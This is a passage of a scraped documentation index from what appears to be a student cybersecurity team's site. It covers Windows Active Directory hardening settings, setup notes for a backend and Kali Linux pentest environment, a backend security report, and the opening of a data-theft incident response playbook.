Public: Logging: Log dropped packets\t'Yes'\tHKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\PublicProfile\\Logging\\LogDroppedPackets Windows Firewall: Public: Logging: Log successful connections\t'Yes'\tHKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\PublicProfile\\Logging\\LogSuccessfulConnections  ","version":"Next","tagName":"h2"},{"title":"3.5. Appendix 5​","type":1,"pageTitle":"Active Directory Windows","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Active_Directory_Windows_Hardening_Guide#35-appendix-5","content":" Category\tPolicy\tSuggested Setting\tHow to VerifyAccount Logon Audit Credential Validation\t'Success and Failure'\tComputer Configuration\\Policies\\Windows Settings\\Security Settings\\Advanced Audit Policy Configuration\\Audit Policies\\Account Logon\\Audit Credential Validation Account Management Audit Application Group Management\t'Success and Failure'\tComputer Configuration\\Policies\\Windows Settings\\Security Settings\\Advanced Audit Policy Configuration\\Audit Policies\\Account Management\\Audit Application Group Management Audit Computer Account Management\t'Success and Failure'\tComputer Configuration\\Policies\\Windows Settings\\Security Settings\\Advanced Audit Policy Configuration\\Audit Policies\\Account Management\\Audit Computer Account Management Audit Distribution Group Management\t'Success and Failure' (DC only)\tComputer Configuration\\Policies\\Windows Settings\\Security Settings\\Advanced Audit Policy Configuration\\Audit Policies\\Account Management\\Audit Distribution Group Management Audit Other Account Management Events\t'Success and Failure'\tComputer Configuration\\Policies\\Windows Settings\\Security Settings\\Advanced Audit Policy Configuration\\Audit Policies\\Account Management\\Audit Other Account Management Events Audit Security Group Management\t'Success and Failure'\tComputer Configuration\\Policies\\Windows Settings\\Security Settings\\Advanced Audit Policy Configuration\\Audit Policies\\Account Management\\Audit Security Group Management Audit User Account Management\t'Success and Failure'\tComputer Configuration\\Policies\\Windows Settings\\Security Settings\\Advanced Audit Policy Configuration\\Audit Policies\\Account Management\\Audit User Account Management Detailed Tracking Audit PNP Activity\t'Success'\tComputer Configuration\\Policies\\Windows Settings\\Security Settings\\Advanced Audit Policy Configuration\\Audit Policies\\Detailed Tracking\\Audit PNP Activity Audit Process Creation\t'Success and Failure'\tComputer Configuration\\Policies\\Windows Settings\\Security Settings\\Advanced Audit Policy Configuration\\Audit Policies\\Detailed Tracking\\Audit Process Creation Audit DPAPI Activity\t'Success and Failure'\tComputer Configuration\\Policies\\Windows Settings\\Security Settings\\Advanced Audit Policy Configuration\\Audit Policies\\Detailed Tracking\\Audit DPAPI Activity DS Access Audit Directory Service Access\t'Success and Failure' (DC only)\tComputer Configuration\\Policies\\Windows Settings\\Security Settings\\Advanced Audit Policy Configuration\\Audit Policies\\DS Access\\Audit Directory Service Access Audit Directory Service Changes\t'Success and Failure' (DC only)\tComputer Configuration\\Policies\\Windows Settings\\Security Settings\\Advanced Audit Policy Configuration\\Audit Policies\\DS Access\\Audit Directory Service Changes Logon/Logoff Audit Account Lockout\t'Success and Failure'\tComputer Configuration\\Policies\\Windows Settings\\Security Settings\\Advanced Audit Policy Configuration\\Audit Policies\\Logon/Logoff\\Audit Account Lockout Audit Group Membership\t'Success'\tComputer Configuration\\Policies\\Windows Settings\\Security Settings\\Advanced Audit Policy Configuration\\Audit Policies\\Logon/Logoff\\Audit Group Membership Audit Logoff\t'Success'\tComputer Configuration\\Policies\\Windows Settings\\Security Settings\\Advanced Audit Policy Configuration\\Audit Policies\\Logon/Logoff\\Audit Logoff Audit Logon\t'Success and Failure'\tComputer Configuration\\Policies\\Windows Settings\\Security Settings\\Advanced Audit Policy Configuration\\Audit Policies\\Logon/Logoff\\Audit Logon Audit Other Logon/Logoff Events\t'Success and Failure'\tComputer Configuration\\Policies\\Windows Settings\\Security Settings\\Advanced Audit Policy Configuration\\Audit Policies\\Logon/Logoff\\Audit Other Logon/Logoff Events Audit Special Logon\t'Success and Failure'\tComputer Configuration\\Policies\\Windows Settings\\Security Settings\\Advanced Audit Policy Configuration\\Audit Policies\\Logon/Logoff\\Audit Special Logon Object Access Audit Removable Storage\t'Success and Failure'\tComputer Configuration\\Policies\\Windows Settings\\Security Settings\\Advanced Audit Policy Configuration\\Audit Policies\\Object Access\\Audit Removable Storage Policy Change Audit Audit Policy Change\t'Success and Failure'\tComputer Configuration\\Policies\\Windows Settings\\Security Settings\\Advanced Audit Policy Configuration\\Audit Policies\\Policy Change\\Audit Audit Policy Change Audit Authentication Policy Change\t'Success'\tComputer Configuration\\Policies\\Windows Settings\\Security Settings\\Advanced Audit Policy Configuration\\Audit Policies\\Policy Change\\Audit Authentication Policy Change Audit Authorization Policy Change\t'Success'\tComputer Configuration\\Policies\\Windows Settings\\Security Settings\\Advanced Audit Policy Configuration\\Audit Policies\\Policy Change\\Audit Authorization Policy Change Privilege Use Audit Sensitive Privilege Use\t'Success and Failure'\tComputer Configuration\\Policies\\Windows Settings\\Security Settings\\Advanced Audit Policy Configuration\\Audit Policies\\Privilege Use\\Audit Sensitive Privilege Use System Audit IPsec Driver\t'Success and Failure'\tComputer Configuration\\Policies\\Windows Settings\\Security Settings\\Advanced Audit Policy Configuration\\Audit Policies\\System\\Audit IPsec Driver Audit Other System Events\t'Success and Failure'\tComputer Configuration\\Policies\\Windows Settings\\Security Settings\\Advanced Audit Policy Configuration\\Audit Policies\\System\\Audit Other System Events Audit Security State Change\t'Success'\tComputer Configuration\\Policies\\Windows Settings\\Security Settings\\Advanced Audit Policy Configuration\\Audit Policies\\System\\Audit Security State Change Audit Security System Extension\t'Success and Failure'\tComputer Configuration\\Policies\\Windows Settings\\Security Settings\\Advanced Audit Policy Configuration\\Audit Policies\\System\\Audit Security System Extension Audit System Integrity\t'Success and Failure'\tComputer Configuration\\Policies\\Windows Settings\\Security Settings\\Advanced Audit Policy Configuration\\Audit Policies\\System\\Audit System Integrity  ","version":"Next","tagName":"h2"},{"title":"3.6. Appendix 6​","type":1,"pageTitle":"Active Directory Windows","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Active_Directory_Windows_Hardening_Guide#36-appendix-6","content":" Path\tPolicy\tSuggested SettingControl Panel Computer Configuration\\Administrative Templates\\Control Panel\\Personalization\tPrevent enabling lock screen camera\t'Enabled' Prevent enabling lock screen slide show\t'Enabled' Allow Input Personalization\t'Disabled' MSS Computer Configuration\\Administrative Templates\\MSS (Legacy)\tMSS: (AutoAdminLogon) Enable Automatic Logon (not recommended)\t'Disabled' MSS: (DisableIPSourceRouting IPv6) IP source routing protection level\t'Enabled: Highest protection, source routing is completely disabled' MSS: (DisableIPSourceRouting) IP source routing protection level\t'Enabled: Highest protection, source routing is completely disabled' MSS: (EnableICMPRedirect) Allow ICMP redirects to override OSPF generated routes\t'Disabled' MSS: (KeepAliveTime) How often keep-alive packets are sent in milliseconds\t'Enabled: 300,000 or 5 minutes (recommended)' MSS: (NoNameReleaseOnDemand) Allow the computer to ignore NetBIOS name release requests except from WINS servers\t'Enabled' MSS: (PerformRouterDiscovery) Allow IRDP to detect and configure Default Gateway addresses (could lead to DoS)\t'Disabled' MSS: (SafeDllSearchMode) Enable Safe DLL search mode (recommended)\t'Enabled' MSS: (ScreenSaverGracePeriod) The time in seconds before the screen saver grace period expires (0 recommended)\t'Enabled: 5 or fewer seconds' MSS: (TcpMaxDataRetransmissions IPv6) How many times unacknowledged data is retransmitted\t'Enabled: 3' MSS: (TcpMaxDataRetransmissions) How many times unacknowledged data is retransmitted\t'Enabled: 3' MSS: (WarningLevel) Percentage threshold for the security event log at which the system will generate a warning\t'Enabled: 90% or less' Network Computer Configuration\\Policies\\Administrative Templates\\Network\\DNS Client\\Turn off multicast name resolution\tTurn off multicast name resolution\t'Enabled' (MS Only) Computer Configuration\\Policies\\Administrative Templates\\Network\\Fonts\\Enable Font Providers\tEnable Font Providers\t'Disabled' Enable insecure guest logons\t'Disabled' Turn on Mapper I/O (LLTDIO) driver\t'Disabled' Turn on Responder (RSPNDR) driver\t'Disabled' Turn off Microsoft Peer-to-Peer Networking Services\t'Enabled' Prohibit installation and configuration of Network Bridge on your DNS domain network\t'Enabled' Prohibit use of Internet Connection Sharing on your DNS domain network\t'Enabled' Require domain users to elevate when setting a network's location\t'Enabled' Disable IPv6 (Ensure TCPIP6 Parameter 'DisabledComponents\t'0xff (255)' Configuration of wireless settings using Windows Connect Now\t'Disabled' Prohibit access of the Windows Connect Now wizards\t'Enabled' Minimize the number of simultaneous connections to the Internet or a Windows Domain\t'Enabled' Prohibit connection to non-domain networks when connected to domain authenticated network\t'Enabled' System Computer Configuration\\Policies\\Administrative Templates\\System\\Audit Process Creation\\Include command line in process creation events\tInclude command line in process creation events\t'Disabled' Continue experiences on this device\t'Disabled' Turn off background refresh of Group Policy\t'Disabled' Turn off access to the Store\t'Enabled' Turn off Internet Connection Wizard if URL connection is referring to Microsoft.com\t'Enabled' Turn off Internet download for Web publishing and online ordering wizards\t'Enabled' Turn off printing over HTTP\t'Disabled' Turn off Registration if URL connection is referring to Microsoft.com\t'Enabled' Turn off Search Companion content file updates\t'Enabled' Turn off the &quot;Order Prints&quot; picture task\t'Enabled' Turn off the &quot;Publish to Web&quot; task for files and folders\t'Enabled' Turn off the Windows Messenger Customer Experience Improvement Program\t'Enabled' Turn off Windows Customer Experience Improvement Program\t'Enabled' Turn off Windows Error Reporting\t'Enabled' Disallow copying of user input methods to the system account for sign-in\t'Enabled' Block user from showing account details on sign-in\t'Enabled' Logon Computer Configuration\\Policies\\Administrative Templates\\System\\Logon\\Do not display network selection UI\tDo not display network selection UI\t'Enabled' Do not enumerate connected users on domain-joined computers\t'Enabled' Enumerate local users on domain-joined computers\t'Disabled' Turn off app notifications on the lock screen\t'Enabled' Turn on convenience PIN sign-in\t'Disabled' Remote Procedure Call Enable RPC Endpoint Mapper Client Authentication\t'Enabled' Restrict Unauthenticated RPC clients\t'Enabled: Authenticated' Windows Time Service Computer Configuration\\Policies\\Administrative Templates\\System\\Windows Time Service\\Time Providers\\Enable Windows NTP Client\tEnable Windows NTP Client\t'Enabled' Computer Configuration\\Policies\\Administrative Templates\\System\\Windows Time Service\\Time Providers\\Enable Windows NTP Server\tEnable Windows NTP Server\t'Enabled' LAPS Computer Configuration\\Policies\\Administrative Templates\\LAPS\\Enable Local Admin Password Management\tEnable Local Admin Password Management\t'Enabled' Computer Configuration\\Policies\\Administrative Templates\\LAPS\\Password Settings\tPassword Complexity: Large letters + small letters + numbers + special characters\t'Enabled' Password Length: 8 or more\t'8 or more' Password Age (Days): 90 or fewer\t'90 days' SCM Computer Configuration\\Policies\\Administrative Templates\\SCM: Pass the Hash Mitigations\\Apply UAC restrictions to local accounts on network logons\tApply UAC restrictions to local accounts on network logons\t'Enabled' WDigest Authentication\t'Disabled'  ","version":"Next","tagName":"h2"},{"title":"3.7. Appendix 7​","type":1,"pageTitle":"Active Directory Windows","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Active_Directory_Windows_Hardening_Guide#37-appendix-7","content":" Service Name\tRecommended Startup Type\tCommentAlerter\tDisabled Client Services for Netware\tDisabled DHCP Client\tDisable\tEnable, if the System takes dynamic IP from DHCP Server or server configured is in cluster Error Reporting Service\tDisabled Fax Service\tDisabled\tEnable, if Fax service is required on the system. File Services for Macintosh\tDisabled FTP Publishing Service\tDisabled Help and Support\tDisabled Human Interface Device Access\tDisabled IIS Admin Service\tEnabled IMAPI CD – Burning COM Service\tDisabled Internet Connection Sharing\tDisabled Messenger\tDisabled Microsoft POP3 Service\tDisabled Network DDE\tDisabled Network DDE DSDM\tDisabled Portable Media Serial Number\tDisabled Print Server for Macintosh\tDisabled Shell Hardware Detection\tDisabled\tEnable, if Shell Hardware Detection (ShellHWDetection) service is required to monitor and provide notification for AutoPlay hardware events. Simple Mail Transfer Protocol\tDisabled\tEnable, if SMTP server is used. Simple Network Management Protocol (SNMP) Service\tDisabled\tEnable, if SNMP service is required. Simple Network Management Protocol (SNMP) Trap\tDisabled Smart Card\tDisabled\tEnable it if you are using a smart card Special Administration Console Helper\tDisabled Telephony\tDisabled Telnet\tDisabled Uninterruptible Power Supply\tDisabled Upload Manager\tDisabled WebClient\tDisabled Wireless Configuration\tDisabled Bluetooth Service\tDisabled\t ","version":"Next","tagName":"h2"},{"title":"Running Project 8 - Backend","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/RED TEAM/backend-pentest/project-8-backend","content":"Last updated by: T_Apperley, Last updated on: '03/12/2024' Last updated by: T_Apperley, Last updated on: '03/12/2024' Running Project 8 - Backend Setup instructions Setup Environment: Visit the GitHub repository and refer to the README.md file for detailed setup guidelines. Ensure all prerequisites, including specific Python versions or other dependencies, are installed before proceeding. Terminal Setup: Open Visual Studio Code (VS) and access the terminal. Navigate to the project 8 directory using the terminal. (Example: cd path/to/project-8) Activate Virtual Environment: Use the appropriate command to activate the virtual environment based on your operating system. For Windows: venv\\Scripts\\activate For Linux/Mac: source venv/bin/activate Once activated, you should see (venv) displayed in the terminal. Run the Server: Enter the command python manage.py runserver in the terminal. If any issues arise during this step, troubleshoot potential error messages or problems that may occur. Accessing Pages: After running the server successfully, Ctrl+left click on the provided link to open it in your preferred web browser. Explore different pages by navigating to Signup, Login, Home, Navigate through these pages to explore the functionality. Please ask team lead for credentials.","keywords":"","version":"Next"},{"title":"Setting up Pentesting Enviornment","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/RED TEAM/backend-pentest/setup-pentest","content":"Last updated by: T_Apperley, Last updated on: '03/12/2024' Last updated by: T_Apperley, Last updated on: '03/12/2024' Setting up Pentesting Enviornment URLs and whatnot Setting Up Kali Linux Virtual Machine on Oracle VM VirtualBox Download Kali Linux ISO: Obtain the latest Kali Linux ISO from the official website: https://www.kali.org/downloads/. Install Oracle VM VirtualBox: Download and install Oracle VM VirtualBox from https://www.virtualbox.org/. Create a New Virtual Machine: Open VirtualBox and click on &quot;New&quot; to create a new VM. Name it &quot;Kali Linux&quot; and select &quot;Linux&quot; as the type and &quot;Debian (64-bit)&quot; as the version. Allocate Resources: Assign at least 2GB RAM (recommended 4GB for smoother performance). Create a new virtual hard disk or use an existing one, allocating around 20GB. Configure Settings: Right-click on the newly created VM and select &quot;Settings&quot;. Under &quot;System&quot;, adjust the boot order to ensure the optical drive is first. Under &quot;Storage&quot;, choose the Kali Linux ISO as the optical drive. Start the Installation: Click &quot;Start&quot; to boot the VM. Follow the Kali Linux installation prompts. Choose &quot;Graphical Install&quot; for an easier installation process. Complete the Installation: Set up your preferences (language, location, keyboard, etc.). Create a user account and password when prompted. Wait for the installation to complete. Install VirtualBox Guest Additions (Optional but recommended): After Kali Linux installation, select &quot;Devices&quot; in the VirtualBox menu. Click &quot;Insert Guest Additions CD image&quot; and follow the instructions to install. Reboot and Update: Reboot the virtual machine to ensure all changes take effect. Open a terminal and run sudo apt update &amp;&amp; sudo apt upgrade to update Kali Linux","keywords":"","version":"Next"},{"title":"Backend System Report","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/RED TEAM/backend-pentest/system-report","content":"","keywords":"","version":"Next"},{"title":"Introduction:​","type":1,"pageTitle":"Backend System Report","url":"/redback-documentation/docs/cybersecurity/RED TEAM/backend-pentest/system-report#introduction","content":" The backend infrastructure is a meticulously crafted Django-based system designed to serve as the foundation for a secure and functional web application. It encapsulates critical functionalities revolving around user management, authentication, and seamless integration with the frontend.  ","version":"Next","tagName":"h2"},{"title":"Architecture Overview:​","type":1,"pageTitle":"Backend System Report","url":"/redback-documentation/docs/cybersecurity/RED TEAM/backend-pentest/system-report#architecture-overview","content":" ","version":"Next","tagName":"h2"},{"title":"Models:​","type":1,"pageTitle":"Backend System Report","url":"/redback-documentation/docs/cybersecurity/RED TEAM/backend-pentest/system-report#models","content":" Users Model: Captures essential user credentials such as username and password. However, the storage mechanism for passwords requires immediate attention to implement robust security practices.  Warehouse Model: Potentially serves as an extended repository for user-related data, encompassing fields like email and additional_user_info.  ","version":"Next","tagName":"h3"},{"title":"Serializers:​","type":1,"pageTitle":"Backend System Report","url":"/redback-documentation/docs/cybersecurity/RED TEAM/backend-pentest/system-report#serializers","content":" Employs Django REST framework serializers (LoginSerializer, SignupSerializer) to validate and serialize data payloads, ensuring adherence to predefined structures and constraints.  ","version":"Next","tagName":"h3"},{"title":"Views & Endpoints:​","type":1,"pageTitle":"Backend System Report","url":"/redback-documentation/docs/cybersecurity/RED TEAM/backend-pentest/system-report#views--endpoints","content":" Encompasses a collection of views and endpoints facilitating CRUD operations for user data (user_list, user_detail), ensuring comprehensive management capabilities.  Offers dedicated API endpoints for user signup (test_take_input) and login (login), orchestrating seamless user onboarding and secure authentication procedures.  Renders HTML templates (home.html, login.html, signup.html) for intuitive and aesthetically pleasing frontend interactions, fostering a cohesive user experience.  ","version":"Next","tagName":"h3"},{"title":"Functionalities and Features:​","type":1,"pageTitle":"Backend System Report","url":"/redback-documentation/docs/cybersecurity/RED TEAM/backend-pentest/system-report#functionalities-and-features","content":" ","version":"Next","tagName":"h2"},{"title":"User Management:​","type":1,"pageTitle":"Backend System Report","url":"/redback-documentation/docs/cybersecurity/RED TEAM/backend-pentest/system-report#user-management","content":" Empowers the system with robust CRUD functionalities to manage user data effectively, encompassing retrieval, creation, modification, and deletion operations.  Incorporates user authentication and login validation, utilizing stored credentials to authenticate user access securely.  ","version":"Next","tagName":"h3"},{"title":"Signup and Login Processes:​","type":1,"pageTitle":"Backend System Report","url":"/redback-documentation/docs/cybersecurity/RED TEAM/backend-pentest/system-report#signup-and-login-processes","content":" The signup endpoint (test_take_input) meticulously validates incoming user data, ensuring uniqueness for email and username entries before persisting them into the warehouse records.  The login endpoint (login) rigorously checks user-provided credentials against stored information, allowing secure and authenticated user access to the system.  ","version":"Next","tagName":"h3"},{"title":"HTML Templates and User Interface:​","type":1,"pageTitle":"Backend System Report","url":"/redback-documentation/docs/cybersecurity/RED TEAM/backend-pentest/system-report#html-templates-and-user-interface","content":" Showcases visually compelling HTML templates (home.html, login.html, signup.html), delivering an immersive and user-centric interface for seamless frontend interactions and engagements.  ","version":"Next","tagName":"h3"},{"title":"Security Considerations:​","type":1,"pageTitle":"Backend System Report","url":"/redback-documentation/docs/cybersecurity/RED TEAM/backend-pentest/system-report#security-considerations","content":" ","version":"Next","tagName":"h2"},{"title":"Password Security and Storage:​","type":1,"pageTitle":"Backend System Report","url":"/redback-documentation/docs/cybersecurity/RED TEAM/backend-pentest/system-report#password-security-and-storage","content":" The present implementation stores passwords in plaintext, posing a significant security risk. Urgent action involves adopting industry-standard password hashing mechanisms within Django for secure password storage and validation.  ","version":"Next","tagName":"h3"},{"title":"Input Validation and Sanitization:​","type":1,"pageTitle":"Backend System Report","url":"/redback-documentation/docs/cybersecurity/RED TEAM/backend-pentest/system-report#input-validation-and-sanitization","content":" Establishes stringent input validation and sanitization protocols across forms and API endpoints to preemptively combat injection attacks and uphold data integrity.  ","version":"Next","tagName":"h3"},{"title":"Recommendations and Improvement Strategies:​","type":1,"pageTitle":"Backend System Report","url":"/redback-documentation/docs/cybersecurity/RED TEAM/backend-pentest/system-report#recommendations-and-improvement-strategies","content":" ","version":"Next","tagName":"h2"},{"title":"Strengthen Password Security:​","type":1,"pageTitle":"Backend System Report","url":"/redback-documentation/docs/cybersecurity/RED TEAM/backend-pentest/system-report#strengthen-password-security","content":" Swiftly transition to Django's built-in password hashing mechanisms to fortify password security and mitigate potential data breaches or unauthorized access risks.  ","version":"Next","tagName":"h3"},{"title":"Enhance Input Validation Protocols:​","type":1,"pageTitle":"Backend System Report","url":"/redback-documentation/docs/cybersecurity/RED TEAM/backend-pentest/system-report#enhance-input-validation-protocols","content":" Implement comprehensive input validation practices, incorporating stringent data sanitization measures to shield the system against potential security vulnerabilities.  ","version":"Next","tagName":"h3"},{"title":"Documentation and Error Handling:​","type":1,"pageTitle":"Backend System Report","url":"/redback-documentation/docs/cybersecurity/RED TEAM/backend-pentest/system-report#documentation-and-error-handling","content":" Amplify system documentation for APIs and detailed error handling procedures to streamline development workflows, bolster troubleshooting processes, and ensure robust application maintenance.  ","version":"Next","tagName":"h3"},{"title":"Conclusion and Final Remarks:​","type":1,"pageTitle":"Backend System Report","url":"/redback-documentation/docs/cybersecurity/RED TEAM/backend-pentest/system-report#conclusion-and-final-remarks","content":" The backend system embodies a foundational framework proficient in catering to essential user- related functionalities and interactions. However, pivotal enhancements in password security mechanisms, input validation strategies, and comprehensive documentation are paramount to fortify the system's robustness, security posture, and overall reliability ","version":"Next","tagName":"h2"},{"title":"Data-Theft Incident Response Playbook","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Data Theft Incident Response Playbook","content":"","keywords":"","version":"Next"},{"title":"1. Introduction​","type":1,"pageTitle":"Data-Theft Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Data Theft Incident Response Playbook#1-introduction","content":" An organization's reputation may be harmed, confidential data may be compromised, and financial losses may ensue from data theft occurrences. To minimise the effects of data theft events and protect organisational assets, this playbook offers methods and principles for doing so.  ","version":"Next","tagName":"h2"},{"title":"1.1 Overview​","type":1,"pageTitle":"Data-Theft Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Data Theft Incident Response Playbook#11overview","content":" A structured approach for identifying, containing, mitigating, and recovering from data theft events is described in the data theft incident response playbook. To enable a well-coordinated and efficient response effort, it sets roles, duties, and protocols.  ","version":"Next","tagName":"h3"},{"title":"1.2 Purpose​","type":1,"pageTitle":"Data-Theft Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Data Theft Incident Response Playbook#12-purpose","content":" This playbook's goals are to: -Establish a uniform framework for handling situations involving data theft. -Make sure that data breaches are promptly detected and contained. -Reduce the negative effects that data theft events have on the stakeholders, the organization's operations, and its reputation. -Encourage response teams and stakeholders to collaborate, coordinate, and communicate with one another.  ","version":"Next","tagName":"h3"},{"title":"1.3 Attack Definition​","type":1,"pageTitle":"Data-Theft Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Data Theft Incident Response Playbook#13-attack-definition","content":" Unauthorised access to, exfiltration of, or exposure of confidential company information is referred to as data theft. This can contain financial information, confidential information, intellectual property, and personally identifiable information (PII). Incidents of data theft can be caused by several techniques, including as malware, social engineering, phishing, external assaults, and insider threats.  ","version":"Next","tagName":"h3"},{"title":"1.4 Scope​","type":1,"pageTitle":"Data-Theft Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Data Theft Incident Response Playbook#14scope","content":" Any incidences of data theft affecting the systems, apps, networks, and data assets of the company are covered by this playbook. It includes events that have an impact on both internal and external stakeholders, such as partners, customers, staff members, and outside vendors. Regardless of the origin or mode of attack, instances involving both purposeful and accidental data theft are included in the scope.  ","version":"Next","tagName":"h3"},{"title":"2. Attack Types​","type":1,"pageTitle":"Data-Theft Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Data Theft Incident Response Playbook#2-attack-types","content":" The different types of Data-Theft attacks include:  ","version":"Next","tagName":"h2"},{"title":"2.1 Insider Threat​","type":1,"pageTitle":"Data-Theft Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Data Theft Incident Response Playbook#21-insider-threat","content":" An insider threat is when someone steals data from an organisation by using contractors, business partners, or employees.  Signs of Insider Threat:  Abnormal access patterns: Workers accessing private data after hours or on the weekends, in addition to their regular duties.Illegal data access: Workers gaining access to systems or files for which they are not normally authorised.Unauthorised information sharing: Workers disclosing private information to outside parties or persons they are not authorised to.Behavioural or performance changes: Workers displaying abrupt behavioural shifts, such heightened confidentiality or attempts to avoid discovery.Employee discontent or unhappiness: When staff members voice their unhappiness with their jobs or the company, it may spark aggressive behaviour.  ","version":"Next","tagName":"h3"},{"title":"2.2 External Attack​","type":1,"pageTitle":"Data-Theft Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Data Theft Incident Response Playbook#22-external-attack","content":" Data theft carried out by external parties, such as nation-state enemies, hackers, or cybercriminals, is referred to as an external attack.  Signs of External Attack:  Illegal entry attempts: Brute force attacks or suspicious login attempts directed at the networks or systems of the company.Unusual patterns of network traffic: Distinctive communication patterns or massive amounts of data being moved to other sites are examples of anomalies in network traffic.Malicious software or malware presence: Finding malware problems, including ransomware, trojans, or keyloggers, on the company's networks or systems.Phishing attempts: Getting shady emails or communications that try to fool staff members into disclosing private information or installing malicious software.Exploitation of applications or system vulnerabilities: Identification of attempted or accomplished exploitation of known weaknesses in the infrastructure of the company, such as improperly configured systems or unpatched software.  ","version":"Next","tagName":"h3"},{"title":"2.3 Data Breaches​","type":1,"pageTitle":"Data-Theft Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Data Theft Incident Response Playbook#23-data-breaches","content":" Data breaches happen when unapproved parties obtain entry to confidential data that is kept on file by a company.  Signs of Data Breaches:  Unexpected modifications to a user's rights or access authorisation.Unauthorised access attempts indicated by anomalies in system logs.Abnormal network activity patterns, such massive data transfers to other addresses.Conditions in user behaviour, including accessing private information after hours.  ","version":"Next","tagName":"h3"},{"title":"2.4 Phishing Attacks​","type":1,"pageTitle":"Data-Theft Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Data Theft Incident Response Playbook#24-phishing-attacks","content":" Phishing attacks include sending people false emails or messages with the intention of fooling them into disclosing private information, including login passwords or bank account information.  Signs of Phishing Attacks:  Getting faked or unknown sender emails that raise red flags.Email or message requests for private information, including account numbers or passwords.Links in emails that take recipients to phoney websites intended to steal login information.Sent with bad grammar or poor writing quality.  ","version":"Next","tagName":"h3"},{"title":"2.5 Ransomware Attacks​","type":1,"pageTitle":"Data-Theft Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Data Theft Incident Response Playbook#25-ransomware-attacks","content":" Ransomware attacks entail the introduction of software into a victim's computer or network, encrypting files and requesting payment for the key to unlock them.  Signs of Ransomware Attacks:  Unable to access folders or files because they are encrypted.The appearance of messages requesting money in order to unlock the ransom.Abnormal network behaviour as the malware propagates.The existence of files or processes connected to ransomware on compromised computers.  ","version":"Next","tagName":"h3"},{"title":"2.6 Credential Theft​","type":1,"pageTitle":"Data-Theft Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Data Theft Incident Response Playbook#26-credential-theft","content":" Theft of login credentials, which include usernames and passwords, from people or organisations is known as credential theft. The goal is to obtain unauthorised access to accounts or systems.  Signs of Credential Theft:  Notifications of illegal access to systems or user accounts.Unusual locations or a pattern of unsuccessful login attempts are examples of anomalies in login behaviour.Malware that is intended to intercept keystrokes or steal passwords that have been stored.Using credentials that have been stolen to gain access to private data or carry out unauthorised activities.  ","version":"Next","tagName":"h3"},{"title":"3. Stakeholders​","type":1,"pageTitle":"Data-Theft Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Data Theft Incident Response Playbook#3-stakeholders","content":" ","version":"Next","tagName":"h2"},{"title":"3.1 IT Security Team​","type":1,"pageTitle":"Data-Theft Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Data Theft Incident Response Playbook#31-it-security-team","content":" The IT security team oversees overseeing and maintaining the company's security infrastructure, keeping an eye out for any security risks, and handling instances of data theft. Among their duties and functions are:  Examining and assessing security events to ascertain the scope of identity theft.Putting security measures and controls in place to stop more illegal access.Working together with the incident response team to control and lessen the effects of occurrences involving data theft.Using forensic analysis to find the source of security vulnerabilities and stop such situations in the future.Informing top management and other relevant parties on procedure upgrades for incident response and suggesting security enhancements.  ","version":"Next","tagName":"h3"},{"title":"3.2 Incident Response Team​","type":1,"pageTitle":"Data-Theft Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Data Theft Incident Response Playbook#32-incident-response-team","content":" The incident response team oversees overseeing the incident response procedure and organising the organization's reaction to occurrences involving data theft. Among their duties and functions are:  Identifying the extent and consequences of data theft occurrences and taking the necessary remedial measures.Organising staff and resources to limit and lessen the impact of instances of data theft.Carrying out forensic investigations to ascertain the origin and scope of data theft and collect proof for prospective legal proceedings.Keeping customers, third-party vendors, senior management, the IT security team, and other stakeholders at all levels informed about incident response procedures and recovery activities.Recording best practices and lessons gained from data theft events to strengthen the company's incident response skills.  ","version":"Next","tagName":"h3"},{"title":"3.3 Communication Team​","type":1,"pageTitle":"Data-Theft Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Data Theft Incident Response Playbook#33-communication-team","content":" The communication team oversees overseeing both internal and outside communications about cases of data theft and making sure that messages are clear and consistent. Among their duties and functions are:  Creating and carrying out communication strategies to notify stakeholders, including staff members, clients, and outside suppliers, about instances of data theft.Writing and distributing communication materials to respond to questions and concerns from stakeholders, including as statements, news releases, and FAQs.Organising public relations and media relations campaigns to safeguard the company's image and lessen the negative effects of data theft occurrences on its reputation.Regularly updating upper leadership and the incident response team on the state of stakeholder engagement and communication initiatives.  ","version":"Next","tagName":"h3"},{"title":"3.4 Customers​","type":1,"pageTitle":"Data-Theft Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Data Theft Incident Response Playbook#34-customers","content":" Customers are people or organisations that may be impacted by instances of data theft and have a stake in the goods or services offered by the company. Among their duties and functions are:  Notifying the organisation of any unauthorised or questionable activity pertaining to their accounts or transactions.Participating in the investigation of data theft occurrences by offering pertinent data or proof to the organization's incident response team.Adhering to the organization's recommendations and instructions about how to safeguard their personal data and lessen the effects of data theft occurrences.  